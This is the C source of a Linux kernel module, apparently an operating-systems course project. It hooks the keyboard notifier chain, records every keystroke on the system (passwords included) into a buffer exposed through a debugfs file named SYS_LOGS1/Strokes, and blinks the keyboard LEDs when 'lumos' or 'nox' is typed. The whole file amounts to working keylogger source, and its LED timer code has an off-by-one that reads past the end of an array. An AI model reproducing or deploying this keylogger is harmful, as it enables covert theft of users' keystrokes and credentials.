#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/tty.h>
#include <linux/kd.h>
#include <linux/vt.h>
#include <linux/console_struct.h>



#define BLINK_DELAY  HZ/5
#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
extern int fg_console;

struct timer_list my_timer;
struct tty_driver *my_driver;
char kbledstatus = 0;

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("The OS PROJECT team");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Log all keys pressed in the system to debugfs and activate keyboard LEDs");

/* Declarations */
static struct dentry *file;
static struct dentry *subdir;
static unsigned char LED_ORDER[] = { 0x04, 0x02, 0x01 };

#define RESTORE_LEDS 0xFF /* Restore all the LEDs to their status state */

static ssize_t keys_read(struct file *filp,
		char *buffer,
		size_t len,
		loff_t *offset);
		
static int keystrokelogger_cb(struct notifier_block *nblock,
		unsigned long code,
		void *_param);
		
		
static void my_timer_func(unsigned long ptr);
void start_blinking(void);
void stop_blinking(void);




static void my_timer_func(unsigned long ptr)
{
	int *pstatus = (int *) ptr;
	int state = LED_ORDER[*pstatus];

	/* Switch the LED state */
	if (*pstatus < sizeof(LED_ORDER) / sizeof(LED_ORDER[0])) {
		*pstatus += 1;
	} else {
		*pstatus = 0;
	}

	// Call ioctl on the driver in order to update the LED state 
	((my_driver->ops)->ioctl) (vc_cons[fg_console].d->port.tty, KDSETLED, state);

	// Update the timer in order to call this function again 
	my_timer.expires = jiffies + BLINK_DELAY;
	add_timer(&my_timer);
}

void start_blinking(void){

	int i;

	printk(KERN_DEBUG "kbleds: fgconsole is %x\n", fg_console);

	for (i = 0; i < MAX_NR_CONSOLES; i++) {
		if (!vc_cons[i].d)
			break;
	}

	/* Retrieve the driver for the active console */
	my_driver = vc_cons[fg_console].d->port.tty->driver;

	/* Set up timer callback for blinking */
	init_timer(&my_timer);
	my_timer.function = my_timer_func;
	my_timer.data = (unsigned long) &kbledstatus;
	my_timer.expires = jiffies + BLINK_DELAY;
	add_timer(&my_timer);

}

void stop_blinking(void){

	
	del_timer(&my_timer);

	/* Restore LED state */
	
	((my_driver->ops)->ioctl) (vc_cons[fg_console].d->port.tty, KDSETLED, RESTORE_LEDS);

}


static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"}, {"_TAB_", "_TAB_"},
	{"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},
	{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"a", "A"}, {"s", "S"},
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},
	{"'", "\""}, {"`", "~"}, {"_SHIFT_", "_SHIFT_"}, {"\\", "|"},
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},
	{".", ">"}, {"/", "?"}, {"_SHIFT_", "_SHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_ALT_", "_ALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"}, {"_KPD7_", "_HOME_"},
	{"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, {"-", "-"}, {"_KPD4_", "_LEFT_"},
	{"_KPD5_", "_KPD5_"}, {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, {"_KPD._", "_DEL_"},
	{"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, {"\0", "\0"}, {"F11", "F11"},
	{"F12", "F12"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"/", "/"}, {"_PRTSCR_", "_PRTSCR_"},
	{"_ALT_", "_ALT_"}, {"\0", "\0"}, {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"},
	{"_PGUP_", "_PGUP_"}, {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"}, {"_DEL_", "_DEL_"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"_PAUSE_", "_PAUSE_"},
};

static size_t buf_pos;
static char keys_buf[BUF_LEN] = {0};
char our_buf[5]={0};
int flag=0;

const struct file_operations keys_fops = {
	.owner = THIS_MODULE,
	.read = keys_read,
	
};

static ssize_t keys_read(struct file *filp,
		char *buffer,
		size_t len,
		loff_t *offset)
{
	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}


static struct notifier_block keystrokelogger_blk = {
	.notifier_call = keystrokelogger_cb,
};



int keystrokelogger_cb(struct notifier_block *nblock,
		unsigned long code,
		void *_param)
{
	size_t len;
	static int x=0;
	struct keyboard_notifier_param *param = _param;
	const char *pressed_key;

	

	if (!(param->down))
		return NOTIFY_OK;

	if (param->value >= 0x1 && param->value <= 0x77) {
		pressed_key = param->shift
				? us_keymap[param->value][1]
				: us_keymap[param->value][0];
		if (pressed_key) {
			len = strlen(pressed_key);

			if ((buf_pos + len) >= BUF_LEN) {
				memset(keys_buf, 0, BUF_LEN);
				buf_pos = 0;
			}
			if(!flag){
			if(*pressed_key == 'l' && x==0)
				x++;
			else if(*pressed_key == 'u' && x==1)
				x++;
			else if(*pressed_key == 'm' && x==2)
				x++;
			else if(*pressed_key == 'o' && x==3)
				x++;		
			else if(*pressed_key == 's' && x==4){
				start_blinking();
				x=0;
				flag=1;}
			else 
				x=0;
				
			
			}
			if(flag){
			if(*pressed_key == 'n' && x==0)
				x++;
			else if(*pressed_key == 'o' && x==1)
				x++;
					
			else if(*pressed_key == 'x' && x==2){
				x=0;
				flag=0;
				stop_blinking();}
			else 
				x=0;
			
			}
		/*	if(*pressed_key == 'd' && !flag){
				flag=1;
				start_blinking();
				
			}
			
			if(*pressed_key == 'j' && flag){
				flag=0;
				stop_blinking();
			}
			*/
			strncpy(keys_buf + buf_pos, pressed_key, len);
			buf_pos += len;
			keys_buf[buf_pos++] = ' ';

			
		}
	}

	return NOTIFY_OK;
}

static int __init keystrokelogger_init(void)
{
	buf_pos = 0;

	subdir = debugfs_create_dir("SYS_LOGS1", NULL);
	if (IS_ERR(subdir))
		return PTR_ERR(subdir);
	if (!subdir)
		return -ENOENT;

	file = debugfs_create_file("Strokes", S_IRUSR, subdir, NULL, &keys_fops);
	if (!file) {
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}

	register_keyboard_notifier(&keystrokelogger_blk);
	return 0;
}

static void __exit keystrokelogger_exit(void)
{
	unregister_keyboard_notifier(&keystrokelogger_blk);
	debugfs_remove_recursive(subdir);
}

module_init(keystrokelogger_init);
module_exit(keystrokelogger_exit);
